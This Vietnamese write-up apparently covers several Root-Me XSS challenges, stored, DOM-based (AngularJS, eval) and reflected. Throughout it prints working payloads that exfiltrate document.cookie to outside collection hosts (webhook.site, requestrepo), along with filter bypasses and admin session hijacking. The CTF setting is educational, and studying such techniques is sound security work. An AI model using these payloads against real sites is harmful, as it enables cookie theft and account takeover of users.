# XSS - Stored 1
![image](https://hackmd.io/_uploads/HJvufqENp.png)
- Test thử bằng đoạn script đơn giản và nó thành công:

![image](https://hackmd.io/_uploads/Hkv6z9NNp.png)
![image](https://hackmd.io/_uploads/r1qTGqV46.png)
- Để lấy cookie ta dùng **document.cookie**, nhưng vấn đề là sau khi lấy được cookie thì làm sao gửi về cho mình

- Sauu một hồi tìm hiểu mình quyết định xài thẻ **img **– trong html thì khỏi cần đóng thẻ </img>. Và mình sẽ gửi request này đến [requestb.in](https://pipedream.com/@tranminhtuan160403/projects/proj_0ps9Xa/requestbin-p_95CVx3o/build). Đoạn mã script sẽ là như sau:`<script>document.write("<img src='https://k4pazc4w.requestrepo.com?="+document.cookie+"'>");</script>`
- Load lại trang và mình nhận được các reponse:

![image](https://hackmd.io/_uploads/r1PZVqNN6.png)

-`cookie:NkI9qe4cdLIO2P7MIsWS8ofD6`

## XSS DOM Based - Introduction
![image](https://hackmd.io/_uploads/BkZokY4BT.png)
- Vào bài lab mình có thử 1 vài payload như alert(123) nhưng không thành công. Vì đề bài là dom based nên mình sẽ tiến hành mở dev tool đọc source, và 1 đoạn mã script đập ngay vào mắt:
![image](https://hackmd.io/_uploads/rJCbeKVrp.png)
- Mục đích của đoạn code này là lấy input mình nhập vào và so sánh với một số mà hệ thống sinh radom để thực hiện các đoạn code tiếp theo trong vòng if else nhưng nó không có ý nghĩa gì. Điều làm mình chú ý ở đây là biến number lấy dữ liệu mình nhập vào và được gắn trực tiếp vào nó và không có 1 dấu hiệu gì là nó bị mã hóa nên mình đã thử lại với payload `';alert(123);//` khi đó biến number sẽ thành `var number = '';alert(123);//'` từ đó alert(123) sẽ được thực hiện.
![image](https://hackmd.io/_uploads/B1JNWtEST.png)
- Giờ muốn lấy được cookie của admin mình cần đến 1 địa chỉ để chứa các phản hồi có lỗi Dom based XSS được đoạn mã script của mình chuyển hướng tới đó. Ở đây mình sẽ sử dụng [webhook](https://webhook.site/). Và payload là:
 ```
 http://challenge01.root-me.org/web-client/ch32/?number=';window.location.href=`https://webhook.site/fdc65cb1-88fc-40a2-b4f4-b6fd09a593d5?cookie=${document.cookie}`;//
 ```
 ![image](https://hackmd.io/_uploads/SJ4AQtEHT.png)





## XSS DOM Based - AngularJS
![image](https://hackmd.io/_uploads/rkSjtf7Ha.png)
- Đề bài có liên quan đến AngularJs nên mình biết nó dùng {{}} để thực thi đoạn mã. Kiểm chứng điều đó và mình có được kết quả như mong muốn:

![image](https://hackmd.io/_uploads/ryFKcG7r6.png)
- Mình sẽ dùng đoạn mã `{{constructor.constructor('alert(1)')()}}`  khởi tạo trong angular để có thể thực thi đoạn mã javascript bên trong ngoặc tròn nhưng không có chuyện gì xảy ra. Vì thế mình chuyển qua kiểm tra source code thì thấy dấu `''` của mình đã bị xóa

![image](https://hackmd.io/_uploads/Sy1vjGmH6.png)

- Mã hóa thử `''` bằng encode html và thử lại:
![image](https://hackmd.io/_uploads/HyiIhf7rp.png)
- Vậy là việc bypass qua. Bây giờ mình chỉ còn cần viết payload hoàn chỉnh để lấy cookie của admin nữa là hoàn thành `{{constructor.constructor(&#x27;document.location="https://webhook.site/fdc65cb1-88fc-40a2-b4f4-b6fd09a593d5?cookie=".concat(document.cookie)&#x27;)()}}`:

![image](https://hackmd.io/_uploads/HJqNwdNHa.png)

## XSS DOM Based - Eval
![image](https://hackmd.io/_uploads/Hy06s4UBa.png)
- Vẫn là một giao diện quen thuộc lần này mình thử search thử một điều gì đó: 
![image](https://hackmd.io/_uploads/ryTgh48Ha.png)
- Có vẻ như nó đã được regex và cho phép nhập theo đúng định dạng. Thử nhập theo đúng định dạng là phép tính 2 số `1+1` và kết quả là bằng 2. Không có gì đặc biệt nên mình mở thử dev tool xem source:
![image](https://hackmd.io/_uploads/H11chVLST.png)

- hàm [eval()](https://www.w3schools.com/jsref/jsref_eval.asp) thực thi đoạn mã mà không qua bất kỳ câu lệnh nào. Mình thử thêm payload: `1=1, alert(123)` thì thấy nó có thông báo bị filter ![image](https://hackmd.io/_uploads/BkLPCDvST.png)
- Như vậy là nó đã filter `' và ngoặc ()`. Vậy nên mình đã thử payload 
```
1+1,window.location.href=`https://webhook.site/fdc65cb1-88fc-40a2-b4f4-b6fd09a593d5?cookie=${document.cookie}`
```

- Kiểm tra webhook thì nhận được sự tương tác : 
![image](https://hackmd.io/_uploads/HyveWODS6.png)
- Bây giờ mình đổi sang contact và chuyển payload thành:

```
http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1,window.location.href=`https://webhook.site/fdc65cb1-88fc-40a2-b4f4-b6fd09a593d5?cookie=${document.cookie}`
```

![image](https://hackmd.io/_uploads/ByNUbOvSa.png)


## XSS - Reflected

![image](https://hackmd.io/_uploads/rJAZf_vBa.png)

- Ấn vào xem 1 đối tượng bất kỳ, thì mình có để ý trên url: ![image](https://hackmd.io/_uploads/H1pmMdwS6.png)
- Tham số p có nhận giá trị là prices, mình thử thay nó bằng đoạn mã `<script>alert(1)</script>` thì nhận được stutus 404. Mình sẽ kiểm tra mã nguồn xem điều gì đang xảy ra:

![image](https://hackmd.io/_uploads/rkdYvOvBT.png)
- Như vậy là nó lấy nhưng gì mình thêm vào ở url và thêm href của thẻ a. Mình thử thoát khỏi href `"<script>alert(1)<script>` nhưng không thành công:![image](https://hackmd.io/_uploads/HJgkZqdvSa.png)
- Thử đổi lại bằng dấu `'` ![image](https://hackmd.io/_uploads/rJaDsODHa.png)
- Vẫn không thành công, hình như `<>` bị mã hóa nên không nhận nên không nhận. Thử với 1 payload khác `' onmousemove='alert(2)'`
![image](https://hackmd.io/_uploads/ryhQJYvrT.png)
- Như vậy là mình đã chèn được 1 payload xss thành công. Bây giờ mình sẽ thực hiện gửi cookie của admin vào host của mình đã chuẩn bị trước đó: 
```
http://challenge01.root-me.org/web-client/ch26/?p=report&url=http%3A%2F%2Fchallenge01.root-me.org%2Fweb-client%2Fch26%2F%3Fp%3D%2527%2520onmousemove%3D%2527window.location.href=`https://webhook.site/fdc65cb1-88fc-40a2-b4f4-b6fd09a593d5?cookie=${document.cookie}`
```
![image](https://hackmd.io/_uploads/BJ8JMtvS6.png)
## XSS - Stored 2

![image](https://hackmd.io/_uploads/ryLE8tPB6.png)

- Mới vào bài lab thì nó cho mình 2 thẻ input để nhập tiêu đề và nội dung tin nhắn gửi đi. Mình có thử thêm 1 vài thứ gì đó thì nội dung mình thêm vào thì nó sẽ được hiển thị ở cuối trang và ở đây có 1 thứ khác biệt so với bài stored 1 là `status:invite`. Xem source thì mình không phát hiện được gì nên mình sẽ thử xem nội dung của request và respond xem có tìm được gì không:

![image](https://hackmd.io/_uploads/rJISvKwBa.png)
- Như vậy là status nó được gửi đính kèm với cookie. Mình có thắc mắc là không biết status này nó có thay đổi được ở phần cookie hay không vì thế mình đã thử thay đổi nó:

![image](https://hackmd.io/_uploads/rJNsDFPra.png)
- Ồ vậy là nó có thể thay đổi ngay ở request gửi đi. Thế thì chuyện bây giờ chỉ là tìm cách thoát khỏi class. payload:`"> <script>alert(1)</script>//`
![image](https://hackmd.io/_uploads/S1oCOKvra.png)
![image](https://hackmd.io/_uploads/HJaC_YvS6.png)
- Mọi thứ diễn ra khá thuận lợi bây giờ mình click vào admin và bắt lấy request của nó và thay đổi status của nó để nó gửi cookie về host của mình nữa là thành công:

![image](https://hackmd.io/_uploads/H1VyhtDrp.png)
![image](https://hackmd.io/_uploads/BJhk3FPS6.png)
- Có được cookie rồi thay đổi nó và vào bằng quyền administrator thôi

![image](https://hackmd.io/_uploads/HyYJpYPHT.png)
